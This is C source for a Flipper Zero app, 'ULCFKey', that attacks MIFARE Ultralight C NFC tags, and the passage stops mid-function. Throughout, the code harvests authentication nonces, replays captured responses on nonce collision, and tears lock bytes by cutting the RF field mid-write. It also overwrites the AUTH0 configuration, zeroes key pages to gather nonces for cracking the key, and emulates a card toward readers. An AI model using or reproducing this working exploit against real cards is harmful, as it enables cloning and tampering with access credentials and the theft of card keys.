#pragma GCC optimize("O3")
#pragma GCC optimize("-funroll-all-loops")

#pragma GCC diagnostic push
// Suppress specific warnings
#pragma GCC diagnostic ignored "-Wdiscarded-qualifiers"
#pragma GCC diagnostic ignored "-Wunused-function"

#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_cortex.h>
#include <furi_hal_gpio.h>
#include <furi_hal_spi.h>
#include <notification/notification.h>
#include <notification/notification_messages.h>
#include <gui/gui.h>
#include <gui/elements.h>
#include <input/input.h>
#include <furi_hal_nfc.h>
#include <lib/drivers/st25r3916.h>
#include <lib/nfc/protocols/iso14443_3a/iso14443_3a.h>
#include <lib/nfc/protocols/iso14443_3a/iso14443_3a_listener.h>
#include <lib/nfc/protocols/mf_ultralight/mf_ultralight.h>
#include <nfc/nfc.h>
#include <nfc/nfc_device.h>
#include <nfc/nfc_listener.h>
#include <stream/stream.h>
#include <stream/buffered_file_stream.h>

#define TAG                            "ULCFKey"
#define CMD_WUPA                       0x52 // 7 bits
#define CMD_READ_PAGE                  0x30
#define CMD_WRITE_PAGE                 0xA2
#define CMD_ANTICOLL                   0x93
#define CMD_ANTICOLL_2                 0x95
#define CMD_SELECT                     0x93
#define CMD_SELECT_2                   0x95
#define NFC_APP_FOLDER                 EXT_PATH("nfc")
#define NFC_APP_EXTENSION              ".nfc"
#define MF_ULTRALIGHT_C_DICT_USER_PATH EXT_PATH("nfc/assets/mf_ultralight_c_dict_user.nfc")
#define MF_ULCF_NONCE_PATH             EXT_PATH("nfc/.ulcfkey.log")
#define TEAR_DELAY_US                  850

// TODO: Dictionary attack against nt100 with known keys matching expected LFSR properties before bruteforcing

// Attack parameters
#define MAX_NONCES 50

// Structure to store nonce and count
typedef struct {
    uint8_t nonce[8];
    uint16_t count;
} NonceCount;

typedef enum {
    AppStateMain,
    AppStateHelp,
    AppStateCollectNTReady,
    AppStateCollectNTInit,
    AppStateCollectNTWaiting,
    AppStateCollectNRReady,
    AppStateCollectNRInit,
    AppStateCollectNRWaiting,
    AppStateCrackReady,
    AppStateCrackInit,
    AppStateCrackInitialAuth,
    AppStateCrackTearLockbytes,
    AppStateCrackOverwriteAuth0,
    AppStateCrackCollectNonces,
    AppStateComplete,
    AppStateError,
} AppState;

typedef struct {
    uint8_t scroll_pos;
    uint8_t scroll_num;
    FuriString* text;
} HelpState;

typedef struct {
    FuriString* message;
    bool message_received;
} AppData;

typedef struct {
    AppState state;
    const char* error;
    uint8_t auth1_response[8];
    uint8_t auth2_response[16];
    bool auth2_received;
    uint8_t uid[10];
    uint8_t uid_len;
    bool is_vulnerable;
    bool is_static_key;
    bool field_active;
    bool emulate_active;
    NonceCount nonces[MAX_NONCES];
    uint8_t common_nonce[8];
    uint8_t common_nonce_response[16];
    uint8_t nonce_100[8];
    uint8_t nonce_75[8];
    uint8_t nonce_50[8];
    uint8_t nonce_25[8];
    uint32_t tear_delay;
    bool lock_bytes_reset;
    uint8_t lock_bytes_restore[2];
    uint8_t auth0_config_restore;
    uint16_t unique_nonces; // Track number of unique nonces
    uint32_t total_nonces; // Track total nonces seen
    ViewPort* view_port;
    Gui* gui;
    FuriMutex* nfc_mutex;
    AppData* data;
    NotificationApp* notifications;
    FuriMessageQueue* event_queue;
    Nfc* nfc;
    NfcListener* listener;
    NfcDevice* device;
    HelpState* help_state;
} AppContext;

typedef enum {
    EventTypeTick,
    EventTypeKey,
} EventType;

typedef struct {
    EventType type;
    InputEvent input;
} AppEvent;

static void setup_nfc_field(FuriHalSpiBusHandle* handle) {
    FURI_LOG_I(TAG, "setup_nfc_field");
    st25r3916_direct_cmd(handle, ST25R3916_CMD_SET_DEFAULT);
    furi_delay_ms(1);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_write_reg(handle, ST25R3916_REG_MODE, ST25R3916_REG_MODE_om_iso14443a);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_BIT_RATE,
        ST25R3916_REG_BIT_RATE_rxrate_106 | ST25R3916_REG_BIT_RATE_txrate_106);
    st25r3916_write_reg(handle, ST25R3916_REG_RX_CONF1, ST25R3916_REG_RX_CONF1_z600k);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_RX_CONF2,
        ST25R3916_REG_RX_CONF2_sqm_dyn | ST25R3916_REG_RX_CONF2_agc_en |
            ST25R3916_REG_RX_CONF2_agc_m);
    st25r3916_write_reg(handle, ST25R3916_REG_RX_CONF3, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_RX_CONF4, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_ISO14443A_NFC, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_EMD_SUP_CONF, 0x00);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_CORR_CONF1,
        ST25R3916_REG_CORR_CONF1_corr_s7 | ST25R3916_REG_CORR_CONF1_corr_s6 |
            ST25R3916_REG_CORR_CONF1_corr_s5 | ST25R3916_REG_CORR_CONF1_corr_s4);
    st25r3916_write_reg(handle, ST25R3916_REG_CORR_CONF2, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_MASK_RX_TIMER, 0x00);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_TIMER_EMV_CONTROL,
        ST25R3916_REG_TIMER_EMV_CONTROL_nrt_emv_off |
            ST25R3916_REG_TIMER_EMV_CONTROL_nrt_step_64fc);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_FIELD_THRESHOLD_ACTV,
        ST25R3916_REG_FIELD_THRESHOLD_ACTV_trg_105mV |
            ST25R3916_REG_FIELD_THRESHOLD_ACTV_rfe_105mV);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_FIELD_THRESHOLD_DEACTV,
        ST25R3916_REG_FIELD_THRESHOLD_DEACTV_trg_75mV |
            ST25R3916_REG_FIELD_THRESHOLD_DEACTV_rfe_75mV);
    st25r3916_write_reg(handle, ST25R3916_REG_ANT_TUNE_A, 0x82);
    st25r3916_write_reg(handle, ST25R3916_REG_ANT_TUNE_B, 0x82);
    st25r3916_get_irq(handle);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_UNMASK_RECEIVE_DATA);
    furi_delay_ms(1);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_OP_CONTROL,
        ST25R3916_REG_OP_CONTROL_tx_en | ST25R3916_REG_OP_CONTROL_rx_en |
            ST25R3916_REG_OP_CONTROL_en);
    furi_delay_ms(10);
    FURI_LOG_I(TAG, "RF field enabled");
}

static void disable_nfc_field(FuriHalSpiBusHandle* handle) {
    FURI_LOG_I(TAG, "Disabling NFC field");
    st25r3916_write_reg(handle, ST25R3916_REG_OP_CONTROL, 0x00);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_SET_DEFAULT);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);
    furi_delay_ms(1);
    FURI_LOG_I(TAG, "NFC field disabled");
}

static uint16_t calculate_crc16(uint8_t* data, size_t length) {
    uint16_t crc = 0x6363;
    for(size_t i = 0; i < length; i++) {
        uint8_t byte = data[i];
        byte = byte ^ (uint8_t)(crc & 0x00FF);
        byte = byte ^ (byte << 4);
        crc = (crc >> 8) ^ ((uint16_t)byte << 8) ^ ((uint16_t)byte << 3) ^ ((uint16_t)byte >> 4);
    }
    return crc;
}

/*
static void log_rx_data(uint8_t* rx_buffer, size_t rx_bits) {
    if(rx_bits > 0) {
        size_t bytes = (rx_bits + 7) / 8;
        char hex_str[128] = {0};
        char* p = hex_str;
        for(size_t i = 0; i < bytes; i++) {
            p += snprintf(p, sizeof(hex_str) - (p - hex_str), "%02X ", rx_buffer[i]);
        }
        FURI_LOG_D(TAG, "RX(%d bits): %s", (int)rx_bits, hex_str);
    }
}
*/

/**
 * Send WUPA using the ST25R3916 built-in command for short frames.
 * This correctly transmits 0x52 (7 bits) and expects a 2-byte response (44 00).
 */
static bool send_wupa(FuriHalSpiBusHandle* handle, uint8_t* rx_buffer, size_t* rx_bits) {
    // Clear FIFO & interrupts first
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);

    // Disable CRC in receive for short frames, and also ensure parity is handled as 7 bits
    st25r3916_set_reg_bits(handle, ST25R3916_REG_AUX, ST25R3916_REG_AUX_no_crc_rx);
    st25r3916_change_reg_bits(
        handle,
        ST25R3916_REG_ISO14443A_NFC,
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par | ST25R3916_REG_ISO14443A_NFC_no_rx_par),
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par_off | ST25R3916_REG_ISO14443A_NFC_no_rx_par_off));

    // Minimal unmask step: Let's just do the direct command
    uint32_t interrupts =
        (ST25R3916_IRQ_MASK_TXE | ST25R3916_IRQ_MASK_RXS | ST25R3916_IRQ_MASK_RXE |
         ST25R3916_IRQ_MASK_PAR | ST25R3916_IRQ_MASK_CRC | ST25R3916_IRQ_MASK_ERR1 |
         ST25R3916_IRQ_MASK_ERR2);
    // Enable them
    st25r3916_mask_irq(handle, ~interrupts);

    // Issue built-in WUPA short frame
    st25r3916_direct_cmd(handle, ST25R3916_CMD_TRANSMIT_WUPA);

    // TODO: Wait for TXE, RXS, RXE or a timeout
    furi_delay_ms(2);

    bool success = st25r3916_read_fifo(handle, rx_buffer, 64, rx_bits);
    //log_rx_data(rx_buffer, *rx_bits);

    // Re-enable normal CRC for subsequent commands, if desired
    st25r3916_clear_reg_bits(handle, ST25R3916_REG_AUX, ST25R3916_REG_AUX_no_crc_rx);
    return success;
}

/**
 * Send command (using full bytes) and read response from FIFO.
 * Typically used for commands that do have parity + CRC in normal ISO14443A (e.g. READ(0x30)).
 */
static bool send_receive_command_full(
    FuriHalSpiBusHandle* handle,
    const uint8_t* tx_data,
    size_t tx_bits,
    uint8_t* rx_buffer,
    size_t rx_buffer_size,
    size_t* rx_bits,
    bool send_with_crc) {
    // Clear FIFO & interrupts
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);

    // Normal parity, normal CRC
    st25r3916_change_reg_bits(
        handle,
        ST25R3916_REG_ISO14443A_NFC,
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par | ST25R3916_REG_ISO14443A_NFC_no_rx_par),
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par_off | ST25R3916_REG_ISO14443A_NFC_no_rx_par_off));
    st25r3916_clear_reg_bits(handle, ST25R3916_REG_AUX, ST25R3916_REG_AUX_no_crc_rx);

    // Write TX data
    st25r3916_write_fifo(handle, tx_data, tx_bits);

    // Choose transmit with or without CRC
    st25r3916_direct_cmd(
        handle,
        send_with_crc ? ST25R3916_CMD_TRANSMIT_WITH_CRC : ST25R3916_CMD_TRANSMIT_WITHOUT_CRC);

    // TODO: Wait for TXE, RXS, RXE or a timeout
    furi_delay_ms(3);

    // Now read FIFO
    bool success = st25r3916_read_fifo(handle, rx_buffer, rx_buffer_size, rx_bits);
    //log_rx_data(rx_buffer, *rx_bits);
    return success;
}

/**
 * Send command (using full bytes) and tear lock bytes by interrupting a write with a specific delay.
 * Typically used for commands that do have parity + CRC in normal ISO14443A (e.g. READ(0x30)).
 */
static bool send_receive_command_tear(
    FuriHalSpiBusHandle* handle,
    const uint8_t* tx_data,
    size_t tx_bits,
    uint32_t delay_us,
    bool send_with_crc) {
    // Clear FIFO & interrupts
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);

    // Normal parity, normal CRC
    st25r3916_change_reg_bits(
        handle,
        ST25R3916_REG_ISO14443A_NFC,
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par | ST25R3916_REG_ISO14443A_NFC_no_rx_par),
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par_off | ST25R3916_REG_ISO14443A_NFC_no_rx_par_off));
    st25r3916_clear_reg_bits(handle, ST25R3916_REG_AUX, ST25R3916_REG_AUX_no_crc_rx);

    // Write TX data
    st25r3916_write_fifo(handle, tx_data, tx_bits);

    // Choose transmit with or without CRC
    st25r3916_direct_cmd(
        handle,
        send_with_crc ? ST25R3916_CMD_TRANSMIT_WITH_CRC : ST25R3916_CMD_TRANSMIT_WITHOUT_CRC);

    // Wait ticks using DWT counter
    furi_delay_us(delay_us);

    // Disable NFC field without calling disable_nfc_field to avoid overhead of logging and function call (more precise)
    st25r3916_write_reg(handle, ST25R3916_REG_OP_CONTROL, 0x00);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_SET_DEFAULT);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);
    furi_delay_ms(1);

    return true;
}

static bool collect_auth1_challenge(FuriHalSpiBusHandle* handle, AppContext* app, bool ret_early) {
    uint8_t rx_buffer[32];
    size_t rx_bits = 0;

    // 1) WUPA (7 bits) using built-in short frame
    if(!send_wupa(handle, rx_buffer, &rx_bits)) {
        //FURI_LOG_E(TAG, "WUPA transmit failed");
        // Retry once
        if(!send_wupa(handle, rx_buffer, &rx_bits)) {
            FURI_LOG_E(TAG, "WUPA retransmit failed");
            return false;
        }
    }

    if(rx_bits != 16 || rx_buffer[0] != 0x44 || rx_buffer[1] != 0x00) {
        FURI_LOG_E(TAG, "Invalid WUPA response, %d bits", (int)rx_bits);
        return false;
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    // If app->uid_len is 0, then we need to get the UID first, otherwise read page 0
    if(app->uid_len == 0) {
        // ANTICOLL => 16 bits
        uint8_t anticoll[] = {CMD_ANTICOLL, 0x20};
        if(!send_receive_command_full(
               handle, anticoll, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, false)) {
            return false;
        }
        memcpy(app->uid, rx_buffer, 4);

        // SELECT
        uint8_t select_cmd[7];
        select_cmd[0] = CMD_SELECT;
        select_cmd[1] = 0x70;
        memcpy(&select_cmd[2], app->uid, 4);
        uint8_t bcc = app->uid[0] ^ app->uid[1] ^ app->uid[2] ^ app->uid[3];
        select_cmd[6] = bcc;

        if(!send_receive_command_full(
               handle, select_cmd, 7 * 8, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
            return false;
        }
        // Cascade check
        if(rx_buffer[0] & 0x04) {
            // Need second level
            uint8_t anticoll2[] = {CMD_ANTICOLL_2, 0x20};
            if(!send_receive_command_full(
                   handle, anticoll2, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, false)) {
                return false;
            }
            memcpy(&app->uid[4], rx_buffer, 4);
            app->uid_len = 7;

            select_cmd[0] = CMD_SELECT_2;
            memcpy(&select_cmd[2], &app->uid[4], 4);
            bcc = rx_buffer[0] ^ rx_buffer[1] ^ rx_buffer[2] ^ rx_buffer[3];
            select_cmd[6] = bcc;

            if(!send_receive_command_full(
                   handle, select_cmd, 7 * 8, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
                return false;
            }
        } else {
            app->uid_len = 4;
        }
    } else {
        uint8_t read_page_cmd[2] = {CMD_READ_PAGE, 0x00};
        if(!send_receive_command_full(
               handle, read_page_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
            //FURI_LOG_E(TAG, "Read page transmit failed");
            return false;
        }
        // Expect 16 bytes + CRC => 18 bytes => 144 bits
        if(rx_bits != (18 * 8)) {
            //FURI_LOG_E(TAG, "Invalid READ_PAGE response, %d bits", (int)rx_bits);
            return false;
        }
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    // 3) AUTH1 command (0x1A 0x00)
    {
        uint8_t auth1_cmd[2] = {0x1A, 0x00};
        if(!send_receive_command_full(
               handle, auth1_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
            //FURI_LOG_E(TAG, "Failed to send/receive AUTH1 command");
            return false;
        }

        // Expect 10 bytes + 1st byte = 0xAF => 11 bytes => 88 bits
        if(rx_bits != 88 || rx_buffer[0] != 0xAF) {
            //FURI_LOG_E(TAG, "Invalid AUTH1 response, %d bits", (int)rx_bits);
            return false;
        }
    }

    // Extract encrypted RndB from AUTH1 response
    memcpy(app->auth1_response, rx_buffer + 1, 8);

    if(ret_early) {
        return true;
    }

    // Check if this nonce already exists and increment count if found
    bool found = false;
    for(uint16_t i = 0; i < app->unique_nonces; i++) {
        if(memcmp(app->nonces[i].nonce, app->auth1_response, 8) == 0) {
            app->nonces[i].count++;
            found = true;
            break;
        }
    }

    // If not found and we have room, add it as a new nonce
    if(!found && app->unique_nonces < MAX_NONCES) {
        memcpy(app->nonces[app->unique_nonces].nonce, app->auth1_response, 8);
        app->nonces[app->unique_nonces].count = 1;
        app->unique_nonces++;
    }

    app->total_nonces++;

    return true;
}

static bool attempt_auth_with_nonce_collision(FuriHalSpiBusHandle* handle, AppContext* app) {
    uint8_t rx_buffer[32];
    size_t rx_bits = 0;

    // 1) WUPA (7 bits) using built-in short frame
    if(!send_wupa(handle, rx_buffer, &rx_bits)) {
        //FURI_LOG_E(TAG, "WUPA transmit failed");
        // Retry once
        if(!send_wupa(handle, rx_buffer, &rx_bits)) {
            FURI_LOG_E(TAG, "WUPA retransmit failed");
            return false;
        }
    }

    if(rx_bits != 16 || rx_buffer[0] != 0x44 || rx_buffer[1] != 0x00) {
        FURI_LOG_E(TAG, "Invalid WUPA response, %d bits", (int)rx_bits);
        return false;
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    uint8_t read_page_cmd[2] = {CMD_READ_PAGE, 0x00};
    if(!send_receive_command_full(
           handle, read_page_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
        //FURI_LOG_E(TAG, "Read page transmit failed");
        return false;
    }
    // Expect 16 bytes + CRC => 18 bytes => 144 bits
    if(rx_bits != (18 * 8)) {
        //FURI_LOG_E(TAG, "Invalid READ_PAGE response, %d bits", (int)rx_bits);
        return false;
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    // 3) AUTH1 command (0x1A 0x00)
    {
        uint8_t auth1_cmd[2] = {0x1A, 0x00};
        if(!send_receive_command_full(
               handle, auth1_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
            //FURI_LOG_E(TAG, "Failed to send/receive AUTH1 command");
            return false;
        }

        // Expect 10 bytes + 1st byte = 0xAF => 11 bytes => 88 bits
        if(rx_bits != 88 || rx_buffer[0] != 0xAF) {
            //FURI_LOG_E(TAG, "Invalid AUTH1 response, %d bits", (int)rx_bits);
            return false;
        }
    }

    // Extract encrypted RndB from AUTH1 response
    memcpy(app->auth1_response, rx_buffer + 1, 8);

    // Check if this nonce is not the same as the common nonce
    if(memcmp(app->common_nonce, app->auth1_response, 8) != 0) {
        return false;
    }

    // If it is the same, send AUTH2 with common nonce response, starting with 0xAF
    uint8_t auth2_cmd[17];
    auth2_cmd[0] = 0xAF;
    memcpy(auth2_cmd + 1, app->common_nonce_response, 16);
    if(!send_receive_command_full(
           handle, auth2_cmd, 17 * 8, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
        return false;
    }

    // Ensure we've authenticated successfully
    if(rx_bits != 88 || rx_buffer[0] != 0x00) {
        return false;
    }

    return true;
}

static bool attempt_tear_lockbytes(FuriHalSpiBusHandle* handle, AppContext* app) {
    UNUSED(app);
    uint8_t rx_buffer[32];
    size_t rx_bits = 0;

    // First, make sure lock bytes need to be torn
    uint8_t read_page_cmd[2] = {CMD_READ_PAGE, 0x28};
    if(!send_receive_command_full(
           handle, read_page_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
        //FURI_LOG_E(TAG, "Read page transmit failed");
        return false;
    }
    // Expect 16 bytes + CRC => 18 bytes => 144 bits
    if(rx_bits != (18 * 8)) {
        //FURI_LOG_E(TAG, "Invalid READ_PAGE response, %d bits", (int)rx_bits);
        return false;
    }

    // Save auth0 config value in app context to restore later
    app->auth0_config_restore = rx_buffer[8];
    //FURI_LOG_I(TAG, "Auth0 config: %02X", app->auth0_config_restore);

    // Check if tearing is required
    // TODO: Technically if AUTH0 is already 30 (in block 42) we don't care about the 3rd bit of lock byte 1
    bool lock_byte_tearing_required = (((rx_buffer[1] & 0x80) >> 7)) |
                                      (((rx_buffer[1] & 0x20) >> 5));
    if(!lock_byte_tearing_required) {
        FURI_LOG_I(TAG, "Lock bytes do not need tearing");
        return true;
    }
    if(!app->lock_bytes_reset) {
        // Save lock byte values in app context to restore later
        app->lock_bytes_restore[0] = rx_buffer[0];
        app->lock_bytes_restore[1] = rx_buffer[1];
        app->lock_bytes_reset = true;
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    // Tear lock bytes by interrupting a write with a specific delay
    // https://github.com/RfidResearchGroup/proxmark3/blob/3b97acfefe22c976718ed1c214d514ce889f9ac8/armsrc/mifarecmd.c#L3798
    FURI_LOG_I(TAG, "Tearing lock bytes with delay: %lu us", app->tear_delay);
    {
        uint8_t write_cmd[6] = {CMD_WRITE_PAGE, 0x28, 0x00, 0x00, 0x00, 0x00};
        if(!send_receive_command_tear(handle, write_cmd, 48, app->tear_delay, true)) {
            //FURI_LOG_E(TAG, "Failed to send/receive AUTH1 command");
            return false;
        }
    }

    // Return false until the lock bytes are torn
    return false;
}

static bool overwrite_auth0_config(FuriHalSpiBusHandle* handle, AppContext* app) {
    // Don't ask me why this works, something is messed up with the FIFO after it receives the write command reply. I think it just isn't configured to handle 7 bits or something.
    UNUSED(app);
    // TODO: Shouldn't need two buffers
    uint8_t rx_buffer[32];
    uint8_t rx_buffer2[32];
    size_t rx_bits = 0;
    size_t rx_bits2 = 0;

    uint8_t write_cmd[6] = {CMD_WRITE_PAGE, 0x2A, 0x30, 0x00, 0x00, 0x00};
    send_receive_command_full(handle, write_cmd, 48, rx_buffer, sizeof(rx_buffer), &rx_bits, true);

    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    // Verify AUTH0 is now 30
    uint8_t read_page_cmd[2] = {CMD_READ_PAGE, 0x2A};
    if(!send_receive_command_full(
           handle, read_page_cmd, 16, rx_buffer2, sizeof(rx_buffer2), &rx_bits2, true)) {
        //FURI_LOG_E(TAG, "Failed to send/receive read command");
        return false;
    }

    // TODO: Should be [0], but poller is messed up
    if(rx_buffer2[8] != 0x30) {
        FURI_LOG_E(TAG, "AUTH0 is not 30");
        return false;
    }

    return true;
}

// Function to collect single nonce
static bool collect_single_nonce(FuriHalSpiBusHandle* handle, AppContext* app, uint8_t* nonce) {
    // Shutdown NFC field
    disable_nfc_field(handle);

    // Enable NFC field
    setup_nfc_field(handle);

    // Collect nonce
    if(!collect_auth1_challenge(handle, app, true)) {
        FURI_LOG_E(TAG, "Failed to collect nonce");
        return false;
    }

    // Save nonce
    memcpy(nonce, app->auth1_response, 8);

    return true;
}

// Function to overwrite the key page index with 00000000
static bool overwrite_key_page(FuriHalSpiBusHandle* handle, AppContext* app, uint8_t key_index) {
    UNUSED(app);
    uint8_t rx_buffer[32];
    size_t rx_bits = 0;

    // 1) WUPA (7 bits) using built-in short frame
    if(!send_wupa(handle, rx_buffer, &rx_bits)) {
        //FURI_LOG_E(TAG, "WUPA transmit failed");
        // Retry once
        if(!send_wupa(handle, rx_buffer, &rx_bits)) {
            FURI_LOG_E(TAG, "WUPA retransmit failed");
            return false;
        }
    }

    if(rx_bits != 16 || rx_buffer[0] != 0x44 || rx_buffer[1] != 0x00) {
        FURI_LOG_E(TAG, "Invalid WUPA response, %d bits", (int)rx_bits);
        return false;
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    uint8_t read_page_cmd[2] = {CMD_READ_PAGE, 0x00};
    if(!send_receive_command_full(
           handle, read_page_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
        //FURI_LOG_E(TAG, "Read page transmit failed");
        return false;
    }
    // Expect 16 bytes + CRC => 18 bytes => 144 bits
    if(rx_bits != (18 * 8)) {
        //FURI_LOG_E(TAG, "Invalid READ_PAGE response, %d bits", (int)rx_bits);
        return false;
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    uint8_t write_cmd[6] = {0xA2, 0x2C + key_index, 0x00, 0x00, 0x00, 0x00};
    send_receive_command_full(handle, write_cmd, 48, rx_buffer, sizeof(rx_buffer), &rx_bits, true);

    return true;
}

// Function to collect nonces
static bool collect_nonces(FuriHalSpiBusHandle* handle, AppContext* app) {
    // Array of nonce pointers
    uint8_t* nonces[] = {app->nonce_100, app->nonce_75, app->nonce_50, app->nonce_25};

    // Loop through each nonce collection and key page overwrite
    for(int i = 0; i < 4; i++) {
        // Collect nonce
        if(!collect_single_nonce(handle, app, nonces[i])) {
            FURI_LOG_E(TAG, "Failed to collect %d nonce", 100 - (i * 25));
            return false;
        }

        // Overwrite key page i
        if(!overwrite_key_page(handle, app, i)) {
            FURI_LOG_E(TAG, "Failed to overwrite key page %d", i);
            return false;
        }
    }

    return true;
}

static void render_callback(Canvas* canvas, void* ctx) {
    AppContext* app = ctx;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    const char* mode_str = "ULCFKey";
    canvas_draw_str(canvas, 2, 12, mode_str);

    canvas_set_font(canvas, FontSecondary);
    switch(app->state) {
    case AppStateMain:
        canvas_draw_str(canvas, 2, 24, "Ready");
        elements_button_center(canvas, "Start");
        elements_button_right(canvas, "Help");
        break;
    case AppStateHelp:
        elements_scrollbar_pos(
            canvas, 128, 12, 48, app->help_state->scroll_pos, app->help_state->scroll_num);

        // Draw text line by line
        canvas_set_font(canvas, FontSecondary);
        const char* text = furi_string_get_cstr(app->help_state->text);
        const char* line_start = text;
        uint8_t y = 24; // Start y position

        // Draw each line with scroll offset
        while(*line_start) {
            const char* line_end = strchr(line_start, '\n');
            if(!line_end) line_end = line_start + strlen(line_start);

            // Only draw lines that are visible (after scroll offset)
            int line_y = y - (app->help_state->scroll_pos * 12);
            if(line_y >= 24 && line_y < 64) {
                char line_buf[128];
                size_t line_len = line_end - line_start;
                strncpy(line_buf, line_start, line_len);
                line_buf[line_len] = '\0';
                canvas_draw_str(canvas, 2, line_y, line_buf);
            }

            y += 12; // Move to next line position
            if(!*line_end) break;
            line_start = line_end + 1; // Skip the newline
        }
        break;
    case AppStateCollectNTReady:
        canvas_draw_str(canvas, 2, 24, "Place Flipper against card");
        elements_button_center(canvas, "Collect NT");
        break;
    case AppStateCollectNRReady:
        canvas_draw_str(canvas, 2, 24, "Place Flipper against reader");
        elements_button_center(canvas, "Collect NR");
        break;
    case AppStateCollectNTInit:
    case AppStateCollectNTWaiting: {
        char buffer[32];
        char buffer_unique[32];
        snprintf(buffer, sizeof(buffer), "Collecting NT: %lu/%u", app->total_nonces, MAX_NONCES);
        snprintf(buffer_unique, sizeof(buffer_unique), "Unique: %u", app->unique_nonces);
        canvas_draw_str(canvas, 2, 24, buffer);
        canvas_draw_str(canvas, 2, 36, buffer_unique);
        break;
    }
    case AppStateCollectNRInit:
    case AppStateCollectNRWaiting:
        canvas_draw_str(canvas, 2, 24, "Collecting NR");
        break;
    case AppStateCrackReady:
        canvas_draw_str(canvas, 2, 24, "Place Flipper against card");
        elements_button_center(canvas, "Crack");
        break;
    case AppStateCrackInit:
    case AppStateCrackInitialAuth:
        canvas_draw_str(canvas, 2, 24, "Attempting to authenticate...");
        break;
    case AppStateCrackTearLockbytes:
        canvas_draw_str(canvas, 2, 24, "Tearing lock bytes...");
        break;
    case AppStateCrackOverwriteAuth0:
        canvas_draw_str(canvas, 2, 24, "Overwriting AUTH0...");
        break;
    case AppStateCrackCollectNonces:
        canvas_draw_str(canvas, 2, 24, "Collecting nonces...");
        break;
    case AppStateComplete:
        canvas_draw_str(canvas, 2, 24, "Complete!");
        break;
    case AppStateError:
        canvas_draw_str(canvas, 2, 24, "Error!");
        if(app->error) canvas_draw_str(canvas, 2, 36, app->error);
        break;
    }
}

static void input_callback(InputEvent* input_event, void* ctx) {
    furi_assert(ctx);
    AppContext* app = ctx;
    AppEvent event = {.type = EventTypeKey, .input = *input_event};
    furi_message_queue_put(app->event_queue, &event, FuriWaitForever);
}

NfcCommand ulcfkey_listener_callback(NfcGenericEvent event, void* context) {
    AppContext* app = context;
    NfcCommand command = NfcCommandContinue;
    Iso14443_3aListenerEvent* Iso14443_3a_event = event.event_data;
    if(Iso14443_3a_event->type == Iso14443_3aListenerEventTypeReceivedStandardFrame) {
        BitBuffer* buffer = Iso14443_3a_event->data->buffer;
        const uint8_t* data = bit_buffer_get_data(buffer);
        size_t data_len = bit_buffer_get_size_bytes(buffer);
        for(size_t i = 0; i < data_len; i++) {
            FURI_LOG_D(TAG, "Received data: %02X", data[i]);
        }
        if(data_len == 2 && data[0] == 0x1A && data[1] == 0x00) {
            FURI_LOG_I(TAG, "Received AUTH request from reader");
            // Send AUTH-1 reply back to the reader, response must begin with 0xAF
            BitBuffer* auth1_buffer = bit_buffer_alloc(11);
            bit_buffer_append_byte(auth1_buffer, 0xAF);
            bit_buffer_append_bytes(auth1_buffer, app->common_nonce, 8);
            // Append the CRC
            const uint8_t* response_data = bit_buffer_get_data(auth1_buffer);
            uint16_t crc = calculate_crc16((uint8_t*)response_data, 9);
            bit_buffer_append_byte(auth1_buffer, crc & 0xFF);
            bit_buffer_append_byte(auth1_buffer, (crc >> 8) & 0xFF);
            NfcError error = nfc_listener_tx(event.instance, auth1_buffer);
            if(error != NfcErrorNone) {
